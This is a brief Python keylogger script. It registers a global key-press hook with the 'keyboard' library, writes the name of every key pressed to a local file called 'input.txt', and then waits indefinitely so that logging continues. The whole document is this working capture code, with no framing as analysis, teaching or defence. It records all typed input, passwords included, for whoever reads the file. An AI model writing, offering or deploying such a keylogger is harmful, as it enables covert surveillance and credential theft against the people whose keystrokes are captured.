import keyboard

# Define the file to log keystrokes
logger_file = 'input.txt'

# Function to handle key press events
def log_keystroke(event):
    # Append the pressed key to the log file
    with open(logger_file, 'a') as file:
        file.write("{}\n".format(event.name))


keyboard.on_press(log_keystroke)

# Wait for keys to be pressed
keyboard.wait()
